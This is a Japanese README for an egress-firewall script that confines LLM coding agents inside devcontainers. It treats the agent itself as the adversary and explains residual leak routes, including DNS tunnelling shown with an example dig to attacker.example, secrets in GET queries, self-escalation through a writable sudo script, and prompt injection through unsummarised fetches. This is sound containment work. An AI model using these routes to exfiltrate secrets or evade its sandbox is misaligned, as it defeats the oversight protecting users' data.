# @himorogy/egress-guard

**LLM エージェントが動く devcontainer から、意図しない通信先へ出て行けなくする**ための egress 制御スクリプトです。

allowlist に載っていない宛先への外向き通信を遮断し、DNS をコンテナに割り当てられたリゾルバに固定します。プロンプトインジェクションやエージェントの暴走が起きても、秘密やソースコードを書き出せる先を限定することが目的です。

仕様の詳細は [`docs/spec.md`](./docs/spec.md) を参照してください。

---

# できること・できないこと

## できること

* **漏洩先の限定** — allowlist 外への外向き通信を DROP します
* **DNS 経路の固定** — 53 番宛は、割り当てられたリゾルバ以外すべて DROP します
* **踏み台化の防止** — INPUT / OUTPUT / FORWARD すべて default DROP、IPv4 / IPv6 両方
* **プロジェクト単位の追加許可** — `firewall.json` で許可先を足せます

## できないこと（設計上の非目標）

* **悪性コンテンツの流入防止** — allowlist に GitHub や npm がある時点で任意のコンテンツは入ります
* **完全な exfil 防止** — 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります
* **DNS トンネリングの遮断** — 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です
* **L7 制御（メソッド別・パス別）** — 将来 proxy に移行する際の担当範囲です

**想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/design.md`](./docs/design.md) §1・§3。

---

# 動作の概要

`postStartCommand` から root 権限で実行されます。

1. **先にネットワークを閉じる** — IPv6 は最終状態（loopback 以外すべて拒否）へ、IPv4 は bootstrap テーブル（loopback・リゾルバ・確立済みセッション・sshd のみ）へ
2. 閉じた状態のまま、DNS だけを使って allowlist を構築する
3. `ipset swap` で差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
4. 自己検証を実行する

**リビルド中に外部ネットワークを必要とする工程はありません。** 途中で強制終了されても「開いたまま固定される」状態になりません。

**失敗したら panic テーブル**（loopback と確立済み sshd 応答のみ許可、他は全 DROP）を適用して exit≠0 します。`firewall.json` の検証エラーも同様です。`iptables` が使えると確認する前の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。

処理順序の詳細は [`docs/spec.md`](./docs/spec.md) §4.2、その根拠は [`docs/design.md`](./docs/design.md) §2.2・§2.8。

---

# 必要な環境

コンテナ内に次が必要です。配置の仕方は[セットアップ](#セットアップ)。

| パッケージ | 用途 |
|---|---|
| `iptables` | ルール適用（`iptables-restore` / `ip6tables-restore` を含む） |
| `ipset` | allowlist の保持 |
| `iproute2` | デフォルトゲートウェイの検出 |
| `dnsutils` | `dig` による名前解決 |
| `jq` | `firewall.json` のパースと検証 |
| `curl` | GitHub meta API の取得、自己検証 |
| `aggregate` | GitHub CIDR の集約（任意。無い場合は警告のみ） |

capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わります**（[capability の付け方](#capability-の付け方は構成で変わる)）。

## DNS リゾルバ

コンテナに割り当てられたリゾルバ（`/etc/resolv.conf` の `nameserver` 行）を読み取り、**そのアドレス宛の 53 番だけを許可**します。それ以外の 53 番宛はすべて DROP し、遮断先を `egress-audit-v4` に記録します。

`nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。

> **これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/design.md`](./docs/design.md) §3.1）。

## ネットワーク構成（推奨）

**推奨は「ユーザー定義ネットワークを、プロジェクトごとに 1 つ」です。**

* Docker の埋め込みリゾルバ `127.0.0.11` は**ユーザー定義ネットワーク上でのみ**提供されます。デフォルトブリッジではホスト側の DNS アドレスが直接書かれ、**そのアドレスの 53 番へ外向きの穴を 1 つ開ける**ことになります。埋め込みリゾルバならパケットが eth0 から出ないため、この穴自体が不要になります
* **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナは相互に到達でき、埋め込み DNS がコンテナ名で解決できてしまいます

どちらも**このパッケージの必須要件ではありません。** スクリプトはどちらの構成でも動き、埋め込みリゾルバでなければ警告を出すだけです。

判断の根拠（ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/design.md`](./docs/design.md) §4 を参照してください。

### 案 A: Docker Compose を使う（推奨）

**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** `initializeCommand` も `--network` も不要で、`docker compose down` でネットワークも消えます。

```yaml
# .devcontainer/docker-compose.yml
services:
  dev:
    build:
      context: .
      dockerfile: Dockerfile
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ../..:/workspace:cached
    command: sleep infinity
```

```jsonc
// .devcontainer/devcontainer.json
{
  "name": "my project",
  "dockerComposeFile": "docker-compose.yml",
  "service": "dev",
  "workspaceFolder": "/workspace/my-project",
  "remoteUser": "node",
  "postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
  "waitFor": "postStartCommand"
}
```

**注意:** `dockerComposeFile` を使うと `runArgs` は無視されます。`--cap-add` は `cap_add`、`mounts` は `volumes` に書き換えてください。**`${devcontainerId}` は Compose では使えません**（ボリューム名を固定名にする必要があります）。

> **この構成はまだ実機で検証していません。** 動く一式（`docker-compose.yml` と `devcontainer.compose.json`）をこのリポジトリの `.devcontainer/` に置いてあります。手順は [`docs/verification-record.md`](./docs/verification-record.md) §6.22。

### 案 B: `initializeCommand` でネットワークを用意する

Compose に移行しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。

```jsonc
// .devcontainer/devcontainer.json
"initializeCommand": "docker network inspect egress-guard-${localWorkspaceFolderBasename} >/dev/null 2>&1 || docker network create egress-guard-${localWorkspaceFolderBasename} 2>/dev/null || true",
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW",
  "--network=egress-guard-${localWorkspaceFolderBasename}"
]
```

> 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。

### デフォルトブリッジのまま運用する場合

非推奨ですが動作します。起動時に次の警告が出ます。

```
[firewall] WARNING: DNS pinned to 192.168.65.7 (not the Docker embedded resolver).
[firewall] WARNING: This container is not on a user defined Docker network. See the README for the stronger setup.
```

---

# セットアップ

## Dockerfile に追記するもの

**必要なのは 4 つです。** すべて root で、イメージビルド時に行います。

| 追記するもの | 目的 |
|---|---|
| パッケージのインストール | `iptables` / `ipset` などの実行環境 |
| スクリプトを `/usr/local/bin/` へコピー | `node` が書き換えられない場所に置く |
| `firewall.json` を `/etc/egress-guard/` へコピー | `node` が書き換えられない場所に置く |
| sudoers 行 | `node` が引数なしで実行できるようにする |

```dockerfile
USER root

# 1. 必要なパッケージ（aggregate は任意）
RUN apt-get update && apt-get install -y --no-install-recommends \
      iptables ipset iproute2 dnsutils jq curl aggregate \
  && apt-get clean && rm -rf /var/lib/apt/lists/*

# 2. スクリプトを /usr/local/bin へコピー（パッケージから取得する場合）
RUN npm install -g @himorogy/egress-guard \
  && cp "$(npm root -g)/@himorogy/egress-guard/scripts/init-project-firewall.sh" \
        /usr/local/bin/init-project-firewall.sh \
  && chown root:root /usr/local/bin/init-project-firewall.sh \
  && chmod 755 /usr/local/bin/init-project-firewall.sh

# 3. firewall.json を /etc/egress-guard へコピー（ビルドコンテキストに応じてパスを調整）
COPY firewall.json /etc/egress-guard/firewall.json
RUN chown -R root:root /etc/egress-guard \
  && chmod 755 /etc/egress-guard \
  && chmod 644 /etc/egress-guard/firewall.json

# 4. sudoers。末尾の "" は必須（後述）
RUN printf 'node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""\n' \
      > /etc/sudoers.d/node-firewall \
  && chmod 0440 /etc/sudoers.d/node-firewall

USER node
```

**`postCreateCommand` では配置できません。** 既定で `remoteUser`（＝ `node`）として実行されるためです。

## devcontainer.json に追記するもの

構成によらず必要なのは起動フックだけです。

```jsonc
"postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
"waitFor": "postStartCommand"
```

`waitFor` を `postStartCommand` にしておくと、ファイアウォールの適用に失敗した状態でエディタが使えるようになる前に、失敗が表面化します。

### capability の付け方は構成で変わる

`NET_ADMIN` と `NET_RAW` が要ります。**書く場所が構成で違います。**

| 構成 | 書く場所 |
|---|---|
| Docker Compose（[案 A](#案-a-docker-compose-を使う推奨)。推奨） | `docker-compose.yml` の `cap_add` |
| `build` + `runArgs`（[案 B](#案-b-initializecommand-でネットワークを用意する)） | `devcontainer.json` の `runArgs` |

**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。具体的な書き方は[ネットワーク構成（推奨）](#ネットワーク構成推奨)の各案を参照してください。

## 配置はスクリプトが検証します

**手動での確認手順はありません。** 配置を間違えたまま静かに弱い構成で動く、という状態を避けるため、スクリプト自身が起動時に検証して失敗します。

| 検証されること | 失敗したときのメッセージ |
|---|---|
| スクリプト自身が root 所有・非書き込み可（sudo 経由の実行時のみ） | `must be owned by root ... privilege escalation path` |
| `/etc/egress-guard/firewall.json` が root 所有・非書き込み可・symlink でない | `must be owned by root` / `must not be a symlink` |
| 親ディレクトリ `/etc/egress-guard` が root 所有・非書き込み可 | `must be owned by root ... a writable directory lets the file be replaced` |

sudoers の書き間違い（末尾 `""` の欠落）は、スクリプト側が `SUDO_USER` 付きの引数実行を拒否することで無効化されます。

> **検証の限界。** 悪意をもって差し替えられたスクリプトに対しては、これらの検証は意味を持ちません（差し替えた側が検証コードごと消せます）。捕まえられるのは**設定ミス**であり、それがこの手順で現実に起きる失敗です。詳細は [`docs/design.md`](./docs/design.md) §3.4。

---

## なぜこの置き方なのか

要点だけ。詳細は [`docs/design.md`](./docs/design.md) を参照してください。

| 決まりごと | 理由 |
|---|---|
| スクリプトを `node_modules` から実行しない | 非特権ユーザーが書き込める場所を sudo 対象にすると、**エージェントがスクリプト本体を書き換えて root 実行**できます（[design §2.16](./docs/design.md)） |
| sudoers の末尾 `""` | Cmnd に引数を書かないと「**任意の引数で実行してよい**」という意味になります（[design §2.16](./docs/design.md)） |
| `firewall.json` を `/etc/egress-guard/` に置く | エージェントは再適用をいつでも実行できます。**再適用が読むファイルをエージェントが書き換えられるなら、root を取らずに 2 手でポリシーが無効になります**（[design §2.1](./docs/design.md)） |
| `chattr +i` を使わない | Docker の既定 capability では失敗し、防御価値も限定的（[design §2.16](./docs/design.md)） |

repo 内の `.devcontainer/firewall.json` が「ソース」で、`/etc/egress-guard/firewall.json` が「実効設定」という分離により、次の 2 つが別の操作になります。

| 操作 | 誰が | 必要なもの |
|---|---|---|
| 再解決（CDN の IP 変動への追随） | エージェントでも可 | 再適用のみ |
| ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |

---

# firewall.json

プロジェクト固有の追加許可を書きます。

**読まれるのは `/etc/egress-guard/firewall.json` だけです。** 見つからない場合は基底プロファイルのみで動作します。理由は[なぜこの置き方なのか](#なぜこの置き方なのか)を参照してください。

repo 側の `.devcontainer/firewall.json` はそのソースであり、**イメージを再ビルドしたときに反映されます。** 再ビルド前に内容を検証したい場合は、パスを明示して `--check-config` にかけてください。

```sh
# 再ビルド前に repo 側のコピーを検証する
init-project-firewall.sh --check-config --config .devcontainer/firewall.json

# 現在インストールされている設定を検証する
init-project-firewall.sh --check-config
```

## テンプレート

`templates/` に雛形があります。プロジェクトの `.devcontainer/` にコピーして使ってください。

| ファイル | 用途 |
|---|---|
| `templates/firewall.json` | 通常の初期設定（`enforce`、追加許可なし） |
| `templates/firewall.audit.json` | 新規プロジェクトの立ち上げ用（`audit`） |
| `templates/firewall.example.json` | 全フィールドを埋めた記入例 |

```sh
cp node_modules/@himorogy/egress-guard/templates/firewall.json .devcontainer/firewall.json
```

**JSON にコメントは書けません。** `jq` でパースするため、コメント付きの JSON5 / JSONC 形式は「不正な JSON」として拒否されます。

## スキーマ

```json
{
  "version": 1,
  "profile": "default",
  "mode": "enforce",
  "allowDomains": ["registry.example.com"],
  "allowCidrs": ["203.0.113.0/24"],
  "allowHostPorts": [5432],
  "sshdPort": 22
}
```

| フィールド | 型 | 必須 | 説明 |
|---|---|---|---|
| `version` | int | ✔ | スキーマ版。現在は `1` のみ。未知の版は拒否します |
| `profile` | string | — | 基底プロファイル名。現在は `default` のみ |
| `mode` | `"enforce"` \| `"audit"` | — | 既定は `enforce`。詳細は後述 |
| `allowDomains` | string[] | — | 追加許可ドメイン。**ワイルドカードは使えません**（[理由](#ワイルドカードドメインは使えません)）。具体的なホスト名を書いてください |
| `allowCidrs` | string[] | — | 追加許可 CIDR |
| `allowHostPorts` | int[] | — | ホスト宛に許可する TCP ポート（デフォルトゲートウェイと `host.docker.internal`） |
| `sshdPort` | int | — | コンテナ内 sshd のポート。既定は `22` |

未知のフィールドが含まれている場合は拒否します（タイプミスが黙って無視されるのを防ぐため）。

## 拒否される値

効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** 主なものは次のとおりです（完全な一覧は [`docs/spec.md`](./docs/spec.md) §3.2）。

* **`*` を含むドメイン**（`*.example.com`、`*`、`*.com` など。[理由](#ワイルドカードドメインは使えません)）
* ドメイン名として不正な文字列（シェルのメタ文字、空白、改行など）
* `0.0.0.0/0`、プレフィックス長 8 未満の CIDR
* プライベートアドレス帯を含む CIDR — RFC1918、**CGNAT（`100.64.0.0/10`）**、loopback、link-local、multicast / 予約
  * 前方一致ではなく数値レンジの重複判定を行うため、`100.0.0.0/8` のような包含するスーパーネットも拒否します
* 範囲外のポート番号

**同じ検査は DNS 応答にも掛かります。** 許可したドメインが `169.254.169.254` を返しても allowlist には入りません（[`docs/design.md`](./docs/design.md) §2.9）。

`firewall.json` は **PR レビュー必須ファイル**として扱ってください。

## ホストゲートウェイの扱い

ホスト網は**既定で不許可**です。必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。

許可されるのは**ホストを指すアドレス宛の指定 TCP ポートのみ**で、サブネット全体ではありません。対象は次の 2 つです。

* デフォルトゲートウェイの IP（`ip route show default`）
* `host.docker.internal` の解決結果（私設アドレスであることを検証）

**Docker Desktop ではこの 2 つが別のアドレスになります。** 実測ではゲートウェイ経由でホストに届かず、`host.docker.internal` 側でのみ到達しました（[`docs/design.md`](./docs/design.md) §2.15）。

どちらも取得できない状態で `allowHostPorts` が指定されている場合は、要求された許可を黙って落とすのではなく exit≠0 で停止します。

---

# モードと運用

## enforce（既定）

allowlist 外の外向き通信を REJECT します。遮断された宛先は ipset `egress-audit-v4` に記録されるため、何が弾かれたかを後から確認できます。

## audit

新規プロジェクトの立ち上げ用です。allowlist 外の通信を**遮断せず**、`fw-audit:` プレフィックスでログだけ残します。

```json
{ "version": 1, "mode": "audit" }
```

数日運用して `egress-audit-v4` から必要な宛先を収集し、`firewall.json` に転記してから `enforce` に切り替える、という流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。

**audit でも遮断されるもの:**

* **DNS 固定** — 割り当てられたリゾルバ以外への 53 番宛は audit でも DROP します。正規のトラフィックはそのリゾルバ経由なので実害はなく、ここを緩めるとポリシー全体が無意味になります
* **IPv6** — audit でも拒否のままです。試行はログ（`fw-drop6:`）に残ります。**silent DROP ではなく `icmp6-adm-prohibited` で即断します**（AAAA を持つ許可先への接続が、IPv4 へフォールバックするまで待たされないため）
* **INPUT** — audit でも DROP のままです。audit が緩めるのは IPv4 の外向き通信だけです

## 遮断された宛先を調べる

### ipset `egress-audit-v4`（推奨）

allowlist を通らなかった宛先 IP が自動で溜まります。**enforce / audit の両モードで記録されます。**

```sh
# コンテナ内・root（ホストから: docker exec -u root <container> ipset list egress-audit-v4）
ipset list egress-audit-v4
```

```
Name: egress-audit-v4
Type: hash:ip
Members:
93.184.216.34 timeout 603412
104.16.132.229 timeout 604233
```

**割り当てられたリゾルバ以外への 53 番宛（＝ DNS トンネリングの試行）もここに記録されます。** DNS の DROP は allowlist より前段にあるため、専用の記録ルールを置いています。

記録されるのは IP だけなので、ホスト名は自分で引く必要があります。

```sh
dig +short -x 93.184.216.34
```

**逆引きは当てになりません。** CDN や link-local アドレスは PTR を持たないか、持っていても汎用的な名前しか返しません。空振りする場合は TLS 証明書から引いてください（`audit` モード中、その宛先に到達できる状態で）。

```sh
echo | openssl s_client -connect 93.184.216.34:443 2>/dev/null \
  | openssl x509 -noout -subject -ext subjectAltName
```

必要なものを `firewall.json` の `allowDomains` に転記して再適用してください。

> `169.254.169.254`（クラウドのメタデータサービス）のような link-local アドレスが記録されることがあります。これらは `FORBIDDEN_CIDRS` に含まれるため `firewall.json` では許可できません。遮断されているのが正しい状態です。

エントリは 7 日で自動的に消えます。set はスクリプトを再実行しても**作り直されません**（蓄積が目的のため）。手動で空にしたい場合:

```sh
ipset flush egress-audit-v4
```

> `SET` ターゲットが使えないカーネルでは、この記録ルールを外した構成に自動でフォールバックします。その場合は起動ログに `retrying without the blocked-destination recorder` が出ます。

### カーネルログ（当てにしない）

`fw-drop:` / `fw-audit:` / `fw-dns-drop:` / `fw-drop6:` の `LOG` ルールも入っていますが、**多くの環境では出力されません**（コンテナ内の `dmesg` は `CAP_SYSLOG` が無く読めない。`net.netfilter.nf_log_all_netns` が既定 `0` のためホストからも読めない）。**運用の前提にしないでください。** 経緯と却下した回避策は [`docs/design.md`](./docs/design.md) §2.11。

## 再適用

allowlist は起動時の名前解決に基づくため、CDN の IP 変動で許可先に到達できなくなることがあります。

```sh
sudo /usr/local/bin/init-project-firewall.sh
```

再実行すれば回復します。何度実行しても同じ結果になります（冪等）。

sudoers の設定上、**エージェント自身も再適用できます。** これは意図した設計です。再適用が行うのは `/etc/egress-guard/firewall.json`（root 所有）の再解決だけで、ポリシーそのものは変えられません。「再解決は自由、ポリシー変更は再ビルド」という分離になっています。

---

# トラブルシューティング

## 起動時にファイアウォールの適用が失敗する

panic テーブルが適用され、loopback 以外の通信はできない状態になっています。エラーメッセージを確認してください。

| メッセージ | 原因 |
|---|---|
| `... does not match the schema` / `rejected ... entry` | `firewall.json` の内容が不正。後述の `--check-config` で確認できます。**この場合も panic テーブルが適用されます** |
| `must be owned by root` / `must not be a symlink` / `must not be group or world writable` | `/etc/egress-guard/firewall.json` かその親ディレクトリの所有者・権限が不正。ワークスペースのファイルを bind mount していないか確認してください |
| `no nameserver found in /etc/resolv.conf` | リゾルバが検出できない。DNS を開放するのではなく停止します |
| `declares only non-IPv4 nameservers` | IPv6 のリゾルバしかない。IPv6 は設計上すべて DROP するため名前解決が成立しません |
| `IPv6 is active but ip6tables is unusable` | IPv6 スタックが生きているのに `ip6tables` が使えない状態。IPv6 が素通りするため、あえて停止しています。`iptables` パッケージの導入を確認してください |
| `none of the required base domains resolved` | 名前解決自体が機能していない。Docker のネットワーク設定を確認してください |
| `verify FAILED: ...` | ルールは適用されたが、環境が想定と異なる。個別のメッセージを確認してください |

## 特定の通信だけが通らない

`ipset list egress-audit-v4` で遮断された宛先を確認し、逆引きしてから `firewall.json` の `allowDomains` / `allowCidrs` に追加して再適用してください。

新規プロジェクトで許可先が読めない場合は、いったん `mode: "audit"` で運用してログを集めるのが早道です。

---

# 開発

```sh
pnpm test          # 設定バリデーション + ルール適用
pnpm lint:sh       # shellcheck
```

* `tests/firewall-config.test.sh` — `firewall.json` のスキーマ検証と各バリデータ
* `tests/firewall-rules.test.sh` — `iptables` / `ipset` / `dig` / `curl` などを記録型スタブに差し替え、生成されるフィルタテーブルとコマンド順序を検証します（root 不要）

開発用オプション（`--check-config` / `--config` / `--resolv-conf`）は [`docs/spec.md`](./docs/spec.md) §8。いずれも **`sudo` 経由で引数が渡された場合は拒否されます。**

---

# 既知の課題・制限

**仕様として決まっている制限**は [`docs/spec.md`](./docs/spec.md) §9、その根拠は [`docs/design.md`](./docs/design.md)。**まだ解決していないもの**は [`docs/known-issues.md`](./docs/known-issues.md) にあります。

運用でつまずきやすいものを以下に挙げます。

## ワイルドカードドメインは使えません

`allowDomains` に `*.example.com` のようなワイルドカードは**書けません。** バリデーションで拒否され、起動が失敗します。

```
[firewall] ERROR: rejected allowDomains entry: *.example.com - wildcards are not supported.
DNS cannot enumerate the subdomains of a zone, so a wildcard cannot be expanded into addresses.
List the host names you need instead; run in audit mode and read ipset egress-audit-v4 to find
out which ones those are.
```

**DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** ドメイン名は起動時に IP へ解決して ipset に載せる方式なので、ワイルドカードを展開できません。受理して apex だけ許可する案を採らなかった理由は [`docs/design.md`](./docs/design.md) §2.10。

**回避策: 必要なホスト名を具体的に列挙してください。**

```json
{
	"version": 1,
	"allowDomains": [
		"ep-cool-name-123456.ap-southeast-1.aws.neon.tech",
		"api.example.com"
	]
}
```

どのホスト名が必要かわからない場合は `mode: "audit"` で運用し、`egress-audit-v4` に溜まった IP から逆引き（あるいは TLS 証明書の SAN）で特定してください。

## アドレスが動くドメインは `allowDomains` に書けません

allowlist は**起動時に解決した IP の集合**です。**その起動の間アドレスが変わらないドメインにしか使えません。**

`deb.debian.org` が実例です。Fastly 上にあり **TTL は 25 秒**で、応答は複数の IP を持ち回ります。`allowDomains` に書いても、起動時に掴んだ IP と `apt` が実際に繋ぐ先がずれ、こうなります。

```
Could not connect to debian.map.fastlydns.net:80 (199.232.162.132).
- connect (113: No route to host)
```

**`No route to host` は egress-guard の `REJECT` です。書いてあるのに落ちます。** 同じ日に `nodejs.org` は問題なく通っており、**CDN の性質で成否が分かれます。** 詳細は [`docs/spec.md`](./docs/spec.md) §9.7。

`allowCidrs` での回避は多くの場合採れません。Fastly の公開レンジは 19 件・**304,128 アドレス**あり、Fastly 上の全サイトへの経路を開くことになります。

## コンテナ起動後にセットアップを行う場合

egress-guard は **`postStartCommand` で適用され、その時点でポリシーが閉じます。** したがって**適用より後に外部から何かを取ってくる作業は、そのままでは成立しません。**

実際に踏んだ例です。

* `apt-get install openssh-server ...` — 上記のとおり `deb.debian.org` は `allowDomains` に書いても直りません
* `node-gyp` による Node ヘッダの取得 — `nodejs.org` を `allowDomains` に足せば通ります

**第一選択は、取得をイメージビルド時に移すことです。** それができない場合は、プロビジョニングの間だけ `mode` を `audit` にして再適用し、終わったら元に戻して再適用してください。ホスト側から次の順で行います。

```sh
# [ホスト] コンテナ内の実効設定を audit に落とす
docker exec -u root <container> sh -c '
  cp -a /etc/egress-guard/firewall.json /root/fw.bak
  jq ".mode = \"audit\"" /root/fw.bak > /etc/egress-guard/firewall.json'
docker exec -u root <container> /usr/local/bin/init-project-firewall.sh

# ここでセットアップを流す

# [ホスト] 元に戻して閉じ直す
docker exec -u root <container> sh -c '
  cp -a /root/fw.bak /etc/egress-guard/firewall.json && rm -f /root/fw.bak'
docker exec -u root <container> /usr/local/bin/init-project-firewall.sh
```

**この窓の間、コンテナは外へ出られます。** 途中で失敗しても必ず閉じ直せるように、スクリプト化して `trap` で復元してください。`audit` のまま残ると、以後の `docker start` でも `audit` で立ち上がります。

**コンテナ内から行う手段は用意していません。** 実効設定を書き換えられるのは root だけで、それは I1 の前提です（[`docs/design.md`](./docs/design.md) §2.1）。

## 許可済みドメインへの GET 経由の漏洩は防げません

L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` に入れたドメインへ「クエリ文字列に秘密を載せた GET」を投げる経路は残ります。設計上の非目標であり、クレデンシャル側で受け止める前提です。

## DNS トンネリングは防げません

53 番の宛先はリゾルバ 1 つに固定しますが、**そのリゾルバは再帰問い合わせをします。** [`docs/design.md`](./docs/design.md) §3.1。

## Web 検索は使えます。Web 取得は許可したドメインだけです

Claude Code の **WebSearch は追加設定なしで使えます**（Anthropic 側で完結し、コンテナから egress しません）。

**WebFetch はコンテナ内から取得先へ直接接続します。** したがって `allowDomains` に無いドメインは取得できません。よく参照するドキュメントサイトは `firewall.json` に列挙してください。

取得内容はふつう小型モデルの要約を経由するため、prompt injection の緩衝材になります。**ただし Claude Code が事前承認している 91 のドキュメントドメインでは要約がバイパスされ、原文がそのままコンテキストに入ります。** それらを `allowDomains` に入れるときは、遮断の可否だけでなくこの点も勘定に入れてください。

実測の結果と、バージョンが上がったときの再確認手順は [`docs/web-search-fetch.md`](./docs/web-search-fetch.md)。

## 未検証の環境

実機検証（[`docs/verification-record.md`](./docs/verification-record.md)）は **Docker Desktop（macOS / arm64）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。次は環境を用意できておらず未検証です。

* **IPv6 が有効なコンテナ** — 検証環境には `lo` の `::1` しか IPv6 アドレスがありません
* **Linux ホスト上の Docker** — 検証はすべて linuxkit VM 上です。デフォルトブリッジのリゾルバが実在の LAN 機器になる点、`systemd-resolved` 環境での挙動が未確認
* **CI ランナー / クラウド開発環境 / rootless Docker**

詳細と、それぞれ何が問題になり得るかは [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。
